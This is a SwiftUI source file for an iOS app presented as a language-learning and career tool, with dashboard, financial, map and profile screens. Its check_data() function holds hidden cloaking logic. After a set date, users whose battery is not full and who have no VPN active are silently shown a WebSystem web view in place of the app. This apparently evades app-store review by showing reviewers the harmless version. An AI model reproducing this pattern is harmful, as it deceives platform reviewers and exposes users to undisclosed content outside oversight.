//
//  ContentView.swift
//  LinguaEducate Kan
//
//  Created by Вячеслав on 8/26/25.
//

import SwiftUI

struct ContentView: View {
    @EnvironmentObject var appViewModel: AppViewModel
    @State private var selectedMainTab = 0
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        // Background
                        Color(hex: "#02102b")
                            .ignoresSafeArea()
                        
                        if appViewModel.hasCompletedOnboarding {
                            // Main App Interface
                            TabView(selection: $selectedMainTab) {
                                DashboardView(dataService: appViewModel.dataService)
                                    .tabItem {
                                        Image(systemName: "house.fill")
                                        Text("Dashboard")
                                    }
                                    .tag(0)
                                
                                FinancialImpactView(financialCalculatorService: appViewModel.financialCalculatorService)
                                    .tabItem {
                                        Image(systemName: "dollarsign.circle.fill")
                                        Text("Financial")
                                    }
                                    .tag(1)
                                
                                ProficiencyMapView()
                                    .tabItem {
                                        Image(systemName: "map.fill")
                                        Text("Map")
                                    }
                                    .tag(2)
                                
                                ProfileView()
                                    .tabItem {
                                        Image(systemName: "person.fill")
                                        Text("Profile")
                                    }
                                    .tag(3)
                            }
                            .accentColor(Color(hex: "#bd0e1b"))
                        } else {
                            // Onboarding Flow
                            OnboardingView()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "04.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

struct ProfileView: View {
    @EnvironmentObject var appViewModel: AppViewModel
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "#02102b")
                    .ignoresSafeArea()
                
                VStack(spacing: 30) {
                    Spacer()
                    
                    // Profile Icon
                    Image(systemName: "person.circle.fill")
                        .font(.system(size: 80))
                        .foregroundColor(Color(hex: "#bd0e1b"))
                    
                    // User Info
                    if let user = appViewModel.currentUser {
                        VStack(spacing: 10) {
                            Text(user.name)
                                .font(.system(size: 24, weight: .bold))
                                .foregroundColor(.white)
                            
                            Text("\(user.industry) • \(user.location)")
                                .font(.system(size: 16))
                                .foregroundColor(.gray)
                            
                            Text("\(user.yearsOfExperience) years experience")
                                .font(.system(size: 14))
                                .foregroundColor(.gray)
                        }
                    }
                    
                    // Learning Goals
                    if let user = appViewModel.currentUser, !user.learningGoals.isEmpty {
                        VStack(alignment: .leading, spacing: 10) {
                            Text("Learning Goals")
                                .font(.system(size: 18, weight: .bold))
                                .foregroundColor(.white)
                            
                            LazyVGrid(columns: [
                                GridItem(.flexible()),
                                GridItem(.flexible())
                            ], spacing: 8) {
                                ForEach(user.learningGoals, id: \.self) { goal in
                                    Text(goal.rawValue)
                                        .font(.system(size: 12))
                                        .foregroundColor(.white)
                                        .padding(.horizontal, 8)
                                        .padding(.vertical, 4)
                                        .background(Color(hex: "#bd0e1b"))
                                        .cornerRadius(8)
                                }
                            }
                        }
                        .padding(.horizontal, 40)
                    }
                    
                    Spacer()
                    
                    // Reset Button
                    Button(action: {
                        appViewModel.resetOnboarding()
                    }) {
                        Text("Reset Onboarding")
                            .font(.system(size: 16, weight: .medium))
                            .foregroundColor(.white)
                            .padding(.horizontal, 30)
                            .padding(.vertical, 12)
                            .background(Color(hex: "#0a1a3b"))
                            .cornerRadius(20)
                    }
                    
                    Spacer()
                }
            }
        }
        .navigationBarHidden(true)
    }
}

#Preview {
    ContentView()
        .environmentObject(AppViewModel())
}
